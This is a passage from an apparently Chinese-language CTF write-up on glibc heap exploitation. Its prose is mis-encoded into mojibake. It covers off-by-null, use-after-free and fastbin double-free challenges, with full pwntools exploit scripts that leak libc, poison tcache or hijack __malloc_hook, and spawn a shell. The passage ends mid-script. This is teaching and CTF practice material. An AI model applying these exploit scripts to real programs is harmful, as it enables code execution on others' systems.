alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼ˆéƒ¨åˆ†å‡½æ•°åŠå˜é‡ç»è¿‡é‡å‘½å</p><p><img src="https://i.loli.net/2020/11/16/jIc81hvM6mXdEa5.png" alt="image.png"></p><p>æœä¸å…¶ç„¶ï¼Œä¼ ç»Ÿçš„CTFç­¾åˆ°é¢˜éƒ½æ˜¯å †é¢˜ï¼ŒLCTF2018ä¹Ÿä¸ä¾‹å¤–</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºæœ¬èº«<strong>ä»…ä¼šåˆ†é…å¤§å°ä¸º</strong><code>0xF8</code>çš„å †å—</p><p><img src="https://i.loli.net/2020/11/16/a9BSzldOX1gGQR3.png" alt="image.png"></p><p>åŒæ—¶æœ¬é¢˜åªå…è®¸æˆ‘ä»¬åˆ†é…10ä¸ªå †å—ï¼Œåœ¨éœ€è¦ç”¨7ä¸ªæ¥å¡«æ»¡tcacheçš„å‰æä¸‹ï¼Œ å¯ç”¨ç©ºé—´å±å®æœ‰ä¸€ä¸¶ä¸¶ç´§å¼ </p><p><img src="https://i.loli.net/2020/11/16/WjvhU3xuMOHtXE8.png" alt="image.png"></p><p>æ¼æ´ç‚¹å­˜åœ¨äºè¯»å…¥è¾“å…¥æ—¶ï¼Œä¼šå°†å½“å‰chunkçš„*(ptr + size)ç½®0</p><p><img src="https://i.loli.net/2020/11/16/4cAr58VdzIm3us2.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œè‹¥æ˜¯æˆ‘ä»¬è¾“å…¥çš„sizeä¸º<code>0xf8</code>ï¼Œåˆ™æœ‰æœºä¼šå°†ä¸‹ä¸€ä¸ª<strong>ç‰©ç†ç›¸é‚»chunkçš„PREV_INUSEåŸŸè¦†ç›–ä¸º0</strong>ï¼Œå³<strong>å­˜åœ¨off by nullæ¼æ´</strong></p><blockquote><p>248 &#x3D; 16*15 + 8</p></blockquote><p>é€šè¿‡off by nullæ¼æ´æˆ‘ä»¬ä¾¿å¯ä»¥å®ç°å †å—çš„é‡å ï¼ˆoverlapï¼‰ï¼šåœ¨tcacheæœ‰å…­ä¸ªchunkã€æˆ‘ä»¬æ‰‹ä¸Šæœ‰åœ°å€è¿ç»­çš„ä¸‰ä¸ªchunkï¼šAã€Bã€Cçš„æƒ…å†µä¸‹ï¼Œå…ˆfreeæ‰Bï¼Œé€å…¥tcacheä¸­ä¿æŠ¤èµ·æ¥ï¼Œfreeæ‰Aé€å…¥tcacheï¼Œå†mallocå›Bï¼Œ<strong>è¦†å†™Cçš„PREV_IN_USEä¸º0ï¼Œä¹‹åfreeæ‰Cï¼Œè§¦å‘malloc_consolidateï¼Œåˆå¹¶æˆä¸ºä¸€ä¸ª0x300çš„å¤§chunk</strong>ï¼Œå®ç°<strong>overlapping</strong></p><p>ä¹‹åå€’ç©ºtcacheï¼Œå†åˆ†é…ä¸€ä¸ªchunkï¼Œä¾¿ä¼šåˆ†å‰²unsorted biné‡Œçš„å¤§chunkï¼Œæ­¤æ—¶unsorted biné‡Œçš„chunkä¸æ­¤å‰çš„chunk Bé‡å ï¼Œ<strong>è¾“å‡ºchunk Bçš„å†…å®¹ä¾¿èƒ½è·å¾—libcåŸºå€</strong></p><p>å†åˆ†é…ä¸€ä¸ªchunkä»¥å¾—åˆ°æŒ‡å‘ç›¸åŒä½ç½®ä¸Šçš„å †å—çš„ç´¢å¼•ï¼Œ<strong>åœ¨è¿™é‡Œæ„é€ tcache poisoningè¦†å†™__malloc_hookä¸ºone_gadgetåéšä¾¿åˆ†é…ä¸€ä¸ªchunkå³å¯getshell</strong></p><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨é‡Šæ”¾å †å—çš„åŠŸèƒ½å‡½æ•°ä¸­åœ¨freeå‰ä¼šå…ˆæ¸…ç©ºå †å—å†…å®¹ï¼Œæ•…åœ¨è¿™é‡Œæ— æ³•é€šè¿‡ä¿®æ”¹__free_hookä¸ºsystemåfree(â€œ&#x2F;bin&#x2F;shâ€)çš„æ–¹æ³•æ¥getshellï¼Œå› æ­¤ç¬”è€…åªå¥½é€‰æ‹©æ”»å‡»__malloc_hook</p><p><img src="https://i.loli.net/2021/01/20/Za2wEpFAUu4mN7Q.png" alt="image.png"></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./easy_heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">one_gadget = <span class="number">0x10a41c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;size \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;content \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;index \n&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># malloc the chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill the tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">9</span>-i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unsorted bin chunk consolidate</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># re-malloc the chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># fill the tcache, protect the important chunk</span></span><br><span class="line">    free(<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unsorted bin overlap</span></span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">0xF8</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 7, the former 8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc base</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 8</span></span><br><span class="line">    dump(<span class="number">7</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;libc addr leak: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache poisoning</span></span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>) <span class="comment"># idx 9</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">7</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    new(<span class="number">114</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">114</span>, <span class="string">&quot;arttnba3&quot;</span>)</span><br><span class="line">    new(<span class="number">114</span>, p64(libc_base + one_gadget)) <span class="comment"># fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼ŒæˆåŠŸgetshellï¼ˆæœ¬åœ°ç¯å¢ƒUbuntu18.0.4ï¼‰</p><p><img src="https://i.loli.net/2020/11/26/XAZm7UrvFw8cfih.png" alt="image.png"></p><h3 id="ä¸‰ã€use-after-free"><a href="#ä¸‰ã€use-after-free" class="headerlink" title="ä¸‰ã€use after free"></a>ä¸‰ã€use after free</h3><p>use after freeå³å¯¹äºå‚æ‚¬æŒ‡é’ˆçš„åˆ©ç”¨ï¼Œåœ¨è¿™ç±»é¢˜ç›®ä¸­å¾€å¾€é¢˜ç›®åœ¨é€»è¾‘è®¾è®¡ä¸Šä¼šåœ¨freeä¸€ä¸ªå †å—åç•™ä¸‹ä¸€ä¸ªå‚æ‚¬æŒ‡é’ˆï¼Œæœªå°†å…¶ç½®NULLï¼Œä½¿å¾—è¯¥å †å—è™½ç„¶è¢«freeäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶èƒ½å¤Ÿä½¿ç”¨è¯¥å †å—</p><p>å¸¸è§çš„å‚æ‚¬æŒ‡é’ˆåˆ©ç”¨æœ‰ï¼š</p><ul><li>æ³„éœ²æ•°æ®</li><li>æ„é€ ä»»æ„åœ°å€å†™</li></ul><h5 id="ä¾‹é¢˜ï¼šciscn-2019-n-3-Use-After-Free"><a href="#ä¾‹é¢˜ï¼šciscn-2019-n-3-Use-After-Free" class="headerlink" title="ä¾‹é¢˜ï¼šciscn_2019_n_3 - Use After Free"></a>ä¾‹é¢˜ï¼šciscn_2019_n_3 - Use After Free</h5><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXå’Œcanaryï¼ˆ<del>åˆæ˜¯32ä½å †é¢˜ï¼Œå¥½çƒ¦a</del></p><p><img src="https://i.loli.net/2021/01/31/neG2dQumBhsrzLD.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¤§æ¦‚æ˜¯ä¸€é“æœ‰ç€åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°å †å—åŠŸèƒ½çš„ç¨‹åº</p><p><img src="https://i.loli.net/2021/02/01/rcKNdhuEGpJb1CH.png" alt="image.png"></p><p>é‡Šæ”¾å †å—æ—¶ç”¨çš„æ˜¯å †å—ä¸Šçš„å‡½æ•°æŒ‡é’ˆ</p><p><img src="https://i.loli.net/2021/02/01/HloCX5q9FbcuvRf.png" alt="image.png"></p><p>åœ¨é‡Šæ”¾å †å—åä¸ä¼šå°†å †å—æŒ‡é’ˆç½®NULLï¼Œ<strong>å­˜åœ¨UAFæ¼æ´</strong></p><p><img src="https://i.loli.net/2021/02/01/lBSJXRweGYZjWMN.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/02/01/dQPegf7Bs9NVhxX.png" alt="image.png"></p><p>ç”±äºç¨‹åºä¸­å­˜åœ¨systemå‡½æ•°ï¼Œæ•…è€ƒè™‘é€šè¿‡UAFè¦†å†™å †å—æŒ‡é’ˆä¸ºsystemåæ‰§è¡Œ<code>system(&quot;sh&quot;)</code>ä»¥get shell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>) <span class="comment"># p = remote(&#x27;node3.buuoj.cn&#x27;, 27248)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command: <span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;CNote&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index: <span class="built_in">int</span>, value: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Type&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Value&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(value).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index: <span class="built_in">int</span>, length: <span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Type&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Length&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Value &gt; &quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x114</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x114</span>, <span class="string">b&#x27;arttnba3&#x27;</span>) <span class="comment"># idx 1</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0xc</span>, <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(e.sym[<span class="string">&#x27;system&#x27;</span>])) <span class="comment"># idx2, overlapping with idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>è¿è¡Œå³å¯get shell</p><p><img src="https://i.loli.net/2021/02/01/eEQf6L8dWs2hmk7.png" alt="image.png"></p><h4 id="double-free-1"><a href="#double-free-1" class="headerlink" title="double free"></a>double free</h4><p>double freeåˆ™æ˜¯use after freeä¸­æœ€ä¸ºçƒ­é—¨çš„ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œå½“åŒä¸€ä¸ªchunkåœ¨å †ç®¡ç†å™¨ä¸­åŒæ—¶å­˜åœ¨ä¸¤ä»½å‰¯æœ¬æ—¶ï¼Œæˆ‘ä»¬å°†å…¶ä¸­ä¸€ä¸ªå †å—åˆ†é…å›æ¥å¹¶æ”¹å†™å…¶fdæŒ‡é’ˆï¼Œå½“è¯¥chunkå†ä¸€æ¬¡è¢«å–å‡ºæ—¶ï¼Œç•™åœ¨å †ç®¡ç†å™¨ä¸­çš„chunkåœ°å€ä¾¿æ˜¯ç”±æˆ‘ä»¬æ§åˆ¶çš„chunkåœ°å€ï¼Œæ­¤æ—¶æˆ‘ä»¬å†è¡Œåˆ†é…ä¾¿å¯ä»¥åœ¨æˆ‘ä»¬æ‰€å¸Œæœ›çš„åœ°å€è·å¾—ä¸€ä¸ªchunkï¼Œ<strong>å®ç°ä»»æ„åœ°å€å†™</strong></p><h4 id="fastbin-double-free"><a href="#fastbin-double-free" class="headerlink" title="fastbin double free"></a>fastbin double free</h4><p>ç”±äºfastbinå¯¹äºdouble freeçš„æ£€æŸ¥è¾ƒä¸ºç¨€æ¾ï¼Œæ•…é€šå¸¸è€ƒè™‘é€šè¿‡fastbin double freeè¿›è¡Œä»»æ„åœ°å€å†™</p><p>fastbinä»…ä¼šæ£€æŸ¥é“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ•…ä»…éœ€è¦æ„é€ <code>A-&gt;B-&gt;A</code>çš„free()é“¾å³å¯å®Œæˆfastbin double free</p><h5 id="sizeæ£€æŸ¥"><a href="#sizeæ£€æŸ¥" class="headerlink" title="sizeæ£€æŸ¥"></a>sizeæ£€æŸ¥</h5><p>åœ¨mallocå–å‡ºfastbinä¸­çš„chunkæ—¶ä¼šæ£€æŸ¥å…¶sizeå­—æ®µï¼Œè‹¥ä¸å…¶å¯¹åº”ä¸‹æ ‡ä¸ç›¸ç¬¦åˆ™ä¼šå¼•å‘ç¨‹åºabortï¼Œé™åˆ¶äº†æˆ‘ä»¬æ‰€èƒ½æ„é€ fake chunkçš„ä½ç½®ï¼Œä½†è¯¥sizeæ£€æŸ¥ä¸ä¼šæ£€æŸ¥æ ‡å¿—ä½</p><h5 id="malloc-hook-0x23"><a href="#malloc-hook-0x23" class="headerlink" title="__malloc_hook - 0x23"></a>__malloc_hook - 0x23</h5><p>fastbin attackä¸­åˆ†é…åˆ°__malloc_hooké™„è¿‘çš„fake chunké€šå¸¸éƒ½æ˜¯malloc(0x60)ï¼Œä¹Ÿå°±æ˜¯size &#x3D;&#x3D; 0x71ï¼Œè¿™æ˜¯å› ä¸ºåœ¨__malloc_hook - 0x23è¿™ä¸ªåœ°å€ä¸Šfake chunkçš„SIZEçš„ä½ç½®åˆšå¥½æ˜¯<code>0x7f</code>ï¼Œæ»¡è¶³äº†ç»•è¿‡fastbinçš„sizeæ£€æŸ¥çš„è¦æ±‚</p><p><img src="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png" alt="image.png"></p><p>è¿™æ˜¯ä¸€ä¸ªååˆ†å·§å¦™çš„å†…å­˜ä¸Šçš„ä½ç½®ï¼Œå› ä¸ºæ— è®ºä½•æ—¶è¿™ä¸ªä½ç½®ä¸Šçš„å€¼éƒ½æ˜¯0x7fï¼ŒåŒæ—¶ç¦»__malloc_hookä»…æœ‰0x23å­—èŠ‚çš„è·ç¦»ï¼Œæˆ‘ä»¬åœ¨æ„é€ sizeä¸º0x71çš„fastbin fake chunkæ—¶è‹¥æ˜¯æ„é€ åˆ°è¿™ä¸ªä½ç½®åˆ™å®Œå…¨ä¸éœ€è¦æ‹…å¿ƒsizeæ£€æŸ¥çš„é—®é¢˜ï¼Œå› æ­¤__malloc_hook - 0x23ä¹Ÿå°±æˆä¸ºäº†æ„é€ fastbin fake chunkçš„â€œçƒ­é—¨åœ°å¸¦â€</p><p>éœ€è¦æ³¨æ„çš„æ˜¯åœ¨libc2.31ç‰ˆæœ¬ä¸­è¿™ä¸ªä½ç½®ä¸Šçš„æ•°æ®å·²ç»ä¸å†æ˜¯0x7fï¼Œæ•…æˆ‘ä»¬éœ€è¦<code>å…·ä½“é—®é¢˜å…·ä½“åˆ†æ,å…·ä½“ç‰ˆæœ¬å…·ä½“è°ƒè¯•</code></p><p><img src="https://i.loli.net/2021/02/09/uqTerVoWkSvXM3E.png" alt="image.png"></p><h5 id="ä¾‹é¢˜ï¼šbytectf2019-mulnote-use-after-free-fastbin-attack-one-gadget"><a href="#ä¾‹é¢˜ï¼šbytectf2019-mulnote-use-after-free-fastbin-attack-one-gadget" class="headerlink" title="ä¾‹é¢˜ï¼šbytectf2019 - mulnote - use after free + fastbin attack + one_gadget"></a>ä¾‹é¢˜ï¼šbytectf2019 - mulnote - use after free + fastbin attack + one_gadget</h5><p><a href="/download/bytectf2019/mulnote.zip" title="ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜">ç‚¹å‡»ä¸‹è½½-mulnote.zip</a></p><p>ä¸€é“æœ‰ç€åˆ†é…ã€ç¼–è¾‘ã€æ‰“å°ã€é‡Šæ”¾å †å—åŠŸèƒ½çš„é¢˜ç›®</p><p>æ¼æ´ç‚¹ä¸»è¦åœ¨äºé‡Šæ”¾å‡½æ•°çš„ç­–ç•¥ï¼Œå¯¹äºæ¯ä¸€æ¬¡å †å—çš„é‡Šæ”¾ï¼Œå…¶éƒ½ä¼šèµ·ä¸€ä¸ªæ–°çš„çº¿ç¨‹æ‰§è¡Œé‡Šæ”¾å †å—æ“ä½œ</p><p><img src="https://i.loli.net/2021/02/24/oXgdMnHJvs6cxUO.png" alt="image.png"></p><p>æ¯ä¸€ä¸ªçº¿ç¨‹éƒ½ä¼šè°ƒç”¨<code>start_routine</code>å‡½æ•°å®Œæˆæœ€ç»ˆçš„æ“ä½œï¼Œæ¼æ´ç‚¹å°±åœ¨äº<code>free()</code>ä¹‹åçº¿ç¨‹ä¼šå…ˆä¼‘çœ å‡ ç§’åå†å°†å †å—æŒ‡é’ˆç½®é›¶ï¼Œè‹¥æ˜¯æˆ‘ä»¬åœ¨è¿™æ®µæ—¶é—´å†…è¿›è¡Œå…¶ä»–æ“ä½œï¼Œä¾¿å¯ä»¥double free + åœ°å€æ³„éœ²ä¸€å¥—å¸¦èµ°</p><p><img src="https://i.loli.net/2021/02/24/2V4ELnQedAwPaSZ.png" alt="image.png"></p><p>libc2.23ï¼Œæ²¡æœ‰tcacheï¼Œè€ƒè™‘fastbin double freeåŠ«æŒ__malloc_hookä¸ºone_gadgetä»¥get shell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./mulnote&#x27;</span>, env = &#123;<span 